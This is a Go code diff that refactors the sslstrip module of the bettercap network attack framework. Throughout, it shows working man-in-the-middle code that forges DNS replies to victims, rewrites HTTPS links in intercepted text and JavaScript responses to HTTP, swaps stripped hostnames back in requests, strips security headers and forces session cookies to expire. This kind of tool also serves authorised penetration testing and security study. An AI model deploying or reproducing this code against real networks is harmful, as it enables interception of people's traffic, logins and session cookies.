@@ -7,7 +7,6 @@ import (
 	"net/http"
 	"regexp"
 	"strings"
-	"sync"
 
 	"github.com/bettercap/bettercap/core"
 	"github.com/bettercap/bettercap/log"
@@ -18,7 +17,6 @@ import (
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
-	"github.com/jpillora/go-tld"
 )
 
 var (
@@ -31,108 +29,11 @@ var (
 	}
 )
 
-type cookieTracker struct {
-	sync.RWMutex
-	set map[string]bool
-}
-
-func NewCookieTracker() *cookieTracker {
-	return &cookieTracker{
-		set: make(map[string]bool),
-	}
-}
-
-func (t *cookieTracker) domainOf(req *http.Request) string {
-	if parsed, err := tld.Parse(req.Host); err != nil {
-		log.Warning("Could not parse host %s: %s", req.Host, err)
-		return req.Host
-	} else {
-		return parsed.Domain + "." + parsed.TLD
-	}
-}
-
-func (t *cookieTracker) keyOf(req *http.Request) string {
-	client := strings.Split(req.RemoteAddr, ":")[0]
-	domain := t.domainOf(req)
-	return fmt.Sprintf("%s-%s", client, domain)
-}
-
-func (t *cookieTracker) IsClean(req *http.Request) bool {
-	t.RLock()
-	defer t.RUnlock()
-
-	// we only clean GET requests
-	if req.Method != "GET" {
-		return true
-	}
-
-	// does the request have any cookie?
-	cookie := req.Header.Get("Cookie")
-	if cookie == "" {
-		return true
-	}
-
-	// was it already processed?
-	if _, found := t.set[t.keyOf(req)]; found == true {
-		return true
-	}
-
-	// unknown session cookie
-	return false
-}
-
-func (t *cookieTracker) Track(req *http.Request) {
-	t.Lock()
-	defer t.Unlock()
-	t.set[t.keyOf(req)] = true
-}
-
-func (t *cookieTracker) Expire(req *http.Request) *http.Response {
-	domain := t.domainOf(req)
-	redir := goproxy.NewResponse(req, "text/plain", 302, "")
-
-	for _, c := range req.Cookies() {
-		redir.Header.Add("Set-Cookie", fmt.Sprintf("%s=EXPIRED; path=/; domain=%s; Expires=Mon, 01-Jan-1990 00:00:00 GMT", c.Name, domain))
-		redir.Header.Add("Set-Cookie", fmt.Sprintf("%s=EXPIRED; path=/; domain=%s; Expires=Mon, 01-Jan-1990 00:00:00 GMT", c.Name, c.Domain))
-	}
-
-	redir.Header.Add("Location", req.URL.String())
-	redir.Header.Add("Connection", "close")
-
-	return redir
-}
-
-type hostTracker struct {
-	sync.RWMutex
-	hosts map[string]string
-}
-
-func NewHostTracker() *hostTracker {
-	return &hostTracker{
-		hosts: make(map[string]string, 0),
-	}
-}
-
-func (t *hostTracker) Track(host, stripped string) {
-	t.Lock()
-	defer t.Unlock()
-	t.hosts[stripped] = host
-}
-
-func (t *hostTracker) Unstrip(stripped string) string {
-	t.RLock()
-	defer t.RUnlock()
-	if original, found := t.hosts[stripped]; found == true {
-		return original
-	}
-	return ""
-}
-
 type SSLStripper struct {
 	enabled       bool
 	session       *session.Session
-	cookies       *cookieTracker
-	hosts         *hostTracker
+	cookies       *CookieTracker
+	hosts         *HostTracker
 	handle        *pcap.Handle
 	pktSourceChan chan gopacket.Packet
 }
@@ -161,7 +62,7 @@ func (s *SSLStripper) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp 
 		who = t.String()
 	}
 
-	log.Info("[%s] Sending spoofed DNS reply for %s %s to %s.", core.Green("dns"), core.Red(domain), core.Dim(redir), core.Bold(who))
+	log.Debug("[%s] Sending spoofed DNS reply for %s %s to %s.", core.Green("dns"), core.Red(domain), core.Dim(redir), core.Bold(who))
 
 	var err error
 	var src, dst net.IP
@@ -172,25 +73,14 @@ func (s *SSLStripper) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp 
 		return
 	}
 
-	var ipv6 bool
-
-	if nlayer.LayerType() == layers.LayerTypeIPv4 {
-		pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
-		src = pip.DstIP
-		dst = pip.SrcIP
-		ipv6 = false
-
-	} else {
-		pip := pkt.Layer(layers.LayerTypeIPv6).(*layers.IPv6)
-		src = pip.DstIP
-		dst = pip.SrcIP
-		ipv6 = true
-	}
+	pip := pkt.Layer(layers.LayerTypeIPv4).(*layers.IPv4)
+	src = pip.DstIP
+	dst = pip.SrcIP
 
 	eth := layers.Ethernet{
 		SrcMAC:       peth.DstMAC,
 		DstMAC:       target,
-		EthernetType: layers.EthernetTypeIPv6,
+		EthernetType: layers.EthernetTypeIPv4,
 	}
 
 	answers := make([]layers.DNSResourceRecord, 0)
@@ -214,50 +104,26 @@ func (s *SSLStripper) dnsReply(pkt gopacket.Packet, peth *layers.Ethernet, pudp 
 		Answers:   answers,
 	}
 
+	ip4 := layers.IPv4{
+		Protocol: layers.IPProtocolUDP,
+		Version:  4,
+		TTL:      64,
+		SrcIP:    src,
+		DstIP:    dst,
+	}
+
+	udp := layers.UDP{
+		SrcPort: pudp.DstPort,
+		DstPort: pudp.SrcPort,
+	}
+
+	udp.SetNetworkLayerForChecksum(&ip4)
+
 	var raw []byte
-
-	if ipv6 == true {
-		ip6 := layers.IPv6{
-			Version:    6,
-			NextHeader: layers.IPProtocolUDP,
-			HopLimit:   64,
-			SrcIP:      src,
-			DstIP:      dst,
-		}
-
-		udp := layers.UDP{
-			SrcPort: pudp.DstPort,
-			DstPort: pudp.SrcPort,
-		}
-
-		udp.SetNetworkLayerForChecksum(&ip6)
-
-		err, raw = packets.Serialize(&eth, &ip6, &udp, &dns)
-		if err != nil {
-			log.Error("Error serializing packet: %s.", err)
-			return
-		}
-	} else {
-		ip4 := layers.IPv4{
-			Protocol: layers.IPProtocolUDP,
-			Version:  4,
-			TTL:      64,
-			SrcIP:    src,
-			DstIP:    dst,
-		}
-
-		udp := layers.UDP{
-			SrcPort: pudp.DstPort,
-			DstPort: pudp.SrcPort,
-		}
-
-		udp.SetNetworkLayerForChecksum(&ip4)
-
-		err, raw = packets.Serialize(&eth, &ip4, &udp, &dns)
-		if err != nil {
-			log.Error("Error serializing packet: %s.", err)
-			return
-		}
+	err, raw = packets.Serialize(&eth, &ip4, &udp, &dns)
+	if err != nil {
+		log.Error("Error serializing packet: %s.", err)
+		return
 	}
 
 	log.Debug("Sending %d bytes of packet ...", len(raw))
@@ -280,12 +146,8 @@ func (s *SSLStripper) onPacket(pkt gopacket.Packet) {
 		for _, q := range dns.Questions {
 			domain := string(q.Name)
 			original := s.hosts.Unstrip(domain)
-			if original != "" {
-				if address, err := net.LookupIP(original); err == nil && len(address) > 0 {
-					s.dnsReply(pkt, eth, udp, domain, address[0], dns, eth.SrcMAC)
-				} else {
-					log.Error("Could not resolve %s: %s", original, err)
-				}
+			if original != nil && original.Address != nil {
+				s.dnsReply(pkt, eth, udp, domain, original.Address, dns, eth.SrcMAC)
 			}
 		}
 	}
@@ -355,35 +217,11 @@ func (s *SSLStripper) stripResponseHeaders(res *http.Response) {
 	res.Header.Set("Access-Control-Allow-Headers", "*")
 }
 
-// sslstrip preprocessing, takes care of:
-//
-// - patching / removing security related headers
-// - making unknown session cookies expire
-// - handling stripped domains
-func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redir *http.Response) {
-	if s.enabled == false {
-		return
-	}
-
-	// preprocess request headers
-	s.stripRequestHeaders(req)
-
-	// check if we need to redirect the user in order
-	// to make unknown session cookies expire
-	if s.cookies.IsClean(req) == false {
-		log.Info("[%s] Sending expired cookies for %s to %s", core.Green("sslstrip"), core.Yellow(req.Host), req.RemoteAddr)
-		s.cookies.Track(req)
-		redir = s.cookies.Expire(req)
-	}
-
-	return
-}
-
-func (s *SSLStripper) isHTML(res *http.Response) bool {
+func (s *SSLStripper) isContentStrippable(res *http.Response) bool {
 	for name, values := range res.Header {
 		for _, value := range values {
 			if name == "Content-Type" {
-				return strings.HasPrefix(value, "text/html")
+				return strings.HasPrefix(value, "text/") || strings.Contains(value, "javascript")
 			}
 		}
 	}
@@ -414,10 +252,43 @@ func (s *SSLStripper) processURL(url string) string {
 	return url
 }
 
+// sslstrip preprocessing, takes care of:
+//
+// - patching / removing security related headers
+// - handling stripped domains
+// - making unknown session cookies expire
+func (s *SSLStripper) Preprocess(req *http.Request, ctx *goproxy.ProxyCtx) (redir *http.Response) {
+	if s.enabled == false {
+		return
+	}
+
+	// preprocess request headers
+	s.stripRequestHeaders(req)
+
+	// handle stripped domains
+	original := s.hosts.Unstrip(req.Host)
+	if original != nil {
+		log.Info("[%s] Replacing host %s with %s in request from %s", core.Green("sslstrip"), core.Bold(req.Host), core.Yellow(original.Hostname), req.RemoteAddr)
+		req.Host = original.Hostname
+		req.URL.Host = original.Hostname
+		req.Header.Set("Host", original.Hostname)
+	}
+
+	// check if we need to redirect the user in order
+	// to make unknown session cookies expire
+	if s.cookies.IsClean(req) == false {
+		log.Info("[%s] Sending expired cookies for %s to %s", core.Green("sslstrip"), core.Yellow(req.Host), req.RemoteAddr)
+		s.cookies.Track(req)
+		redir = s.cookies.Expire(req)
+	}
+
+	return
+}
+
 func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 	if s.enabled == false {
 		return
-	} else if s.isHTML(res) == false {
+	} else if s.isContentStrippable(res) == false {
 		return
 	}
 
@@ -434,12 +305,25 @@ func (s *SSLStripper) Process(res *http.Response, ctx *goproxy.ProxyCtx) {
 	body := string(raw)
 	urls := make(map[string]string, 0)
 	matches := httpsLinksParser.FindAllString(body, -1)
-	for _, url := range matches {
-		urls[url] = s.processURL(url)
+	for _, u := range matches {
+		// make sure we only strip stuff we're able to
+		// resolve and process
+		if strings.ContainsRune(u, '.') == true {
+			urls[u] = s.processURL(u)
+		}
+	}
+
+	nurls := len(urls)
+	if nurls > 0 {
+		plural := "s"
+		if nurls == 1 {
+			plural = ""
+		}
+		log.Info("[%s] Stripping %d SSL link%s from %s", core.Green("sslstrip"), nurls, plural, core.Bold(res.Request.Host))
 	}
 
 	for url, stripped := range urls {
-		log.Info("Stripping url %s to %s", core.Bold(url), core.Yellow(stripped))
+		log.Debug("Stripping url %s to %s", core.Bold(url), core.Yellow(stripped))
 
 		body = strings.Replace(body, url, stripped, -1)
 
